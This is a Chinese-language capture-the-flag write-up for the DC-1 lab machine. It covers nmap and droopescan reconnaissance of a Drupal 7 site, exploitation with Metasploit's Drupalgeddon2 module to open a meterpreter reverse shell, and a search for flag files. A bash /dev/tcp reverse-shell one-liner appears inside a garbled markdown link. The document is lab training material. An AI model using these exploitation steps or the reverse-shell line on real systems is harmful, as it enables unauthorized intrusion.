# DC1-WriteUp

靶机地址：172.16.0.105

## 信息收集

### 主机存活扫描

[nmap](Security/安全工具/nmap.md) 局域网存活扫描

```
nmap -sP 172.16.0.0/24
```

确定目标，加快扫描速度，缩小范围。扫描端口信息

```
nmap -sV 172.16.0.100-105
# -sV 目标服务器端口以及版本信息
```

确定靶机目标地址以及基础信息

```
Nmap scan report for 172.16.0.105
Host is up (0.0080s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 6.0p1 Debian 4+deb7u7 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.2.22 ((Debian))
111/tcp open  rpcbind 2-4 (RPC #100000)
MAC Address: 34:C9:3D:CD:6B:3A (Intel Corporate)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### CMS版本识别

[nmap](Security/安全工具/nmap.md) 调用模块扫描，CMS 版本为 Drupal 7

```
# nmap -sC 172.16.0.105

PORT    STATE SERVICE
80/tcp  open  http
|_http-generator: Drupal 7 (http://drupal.org)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt
|_/LICENSE.txt /MAINTAINERS.txt
|_http-title: Welcome to Drupal Site | Drupal Site
```

[droopescan](Security/安全工具/droopescan.md) 扫描，CMS 版本 为 7.2x

```
# droopescan scan drupal -u http://172.16.0.105

[+] Plugins found:
    ctools http://172.16.0.105/sites/all/modules/ctools/
        http://172.16.0.105/sites/all/modules/ctools/LICENSE.txt
        http://172.16.0.105/sites/all/modules/ctools/API.txt
    views http://172.16.0.105/sites/all/modules/views/
        http://172.16.0.105/sites/all/modules/views/README.txt
        http://172.16.0.105/sites/all/modules/views/LICENSE.txt
    profile http://172.16.0.105/modules/profile/
    php http://172.16.0.105/modules/php/
    image http://172.16.0.105/modules/image/

[+] Themes found:
    seven http://172.16.0.105/themes/seven/
    garland http://172.16.0.105/themes/garland/

[+] Possible version(s):
    7.22
    7.23
    7.24
    7.25
    7.26

[+] Possible interesting urls found:
    Default admin - http://172.16.0.105/user/login

[+] Scan finished (0:08:25.061813 elapsed)
```

## 渗透测试

### 漏洞利用

[searchsploit](Security/安全工具/searchsploit.md) 查找 [Metasploit](Security/安全工具/Metasploit.md) 内包含可利用模块的漏洞

```
# searchsploit Drupal 7.2 metasploit
[*] exec: searchsploit Drupal 7.2 metasploit

--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                 | php/webapps/44557.rb
Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                  | php/remote/44482.rb
Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                    | php/remote/46510.rb
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
```

msfconsole 利用模块，获取 Shell

```
[msf6 > search Drupalgeddon2

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/drupal_drupalgeddon2](<msf6 %3E search Drupalgeddon2

Matching Modules
================

   #  Name                                      Disclosure Date  Rank       Check  Description
   -  ----                                      ---------------  ----       -----  -----------
   0  exploit/unix/webapp/drupal_drupalgeddon2  2018-03-28       excellent  Yes    Drupal Drupalgeddon 2 Forms API Property Injection


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/drupal_drupalgeddon2

msf6 exploit(unix/webapp/drupal_drupalgeddon2) > use exploit/unix/webapp/drupal_drupalgeddon2
[*] Using configured payload php/meterpreter/reverse_tcp msf6 exploit(unix/webapp/drupal_drupalgeddon2) > set RHOSTS 172.16.0.105
RHOSTS => 172.16.0.105
msf6 exploit(unix/webapp/drupal_drupalgeddon2) > exploit

[*] Started reverse TCP handler on 172.16.0.103:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[!] The service is running, but could not be validated.
[*] Sending stage (39927 bytes) to 172.16.0.105
[*] Meterpreter session 1 opened (172.16.0.103:4444 -> 172.16.0.105:56893) at 2022-08-03 06:10:41 +0800

meterpreter >
```

### 后渗透

全盘检索 flag 文件 #待补充

```
[bash-i>&/dev/tcp/[address]/[port]>&1](<find / -name flag* 2%3E/dev/null
/home/flag4
/home/flag4/flag4.txt
/var/www/flag1.txt
/usr/src/linux-headers-3.2.0-6-686-pae/include/config/zone/dma/flag.h
/usr/lib/gcc-4.9-backport/lib/gcc/i486-linux-gnu/4.9/plugin/include/flags.h
/usr/lib/gcc-4.9-backport/lib/gcc/i486-linux-gnu/4.9/plugin/include/flag-types.h
```

## 相关链接
- [DC-1 Walk-Through](https://dmcxblue.net/2019/08/28/dc-1-walk-through/)
- [Vulnhub Write-up —DC-1](https://infosecwriteups.com/vulnhub-writeup-dc-1-37dcf92b456a)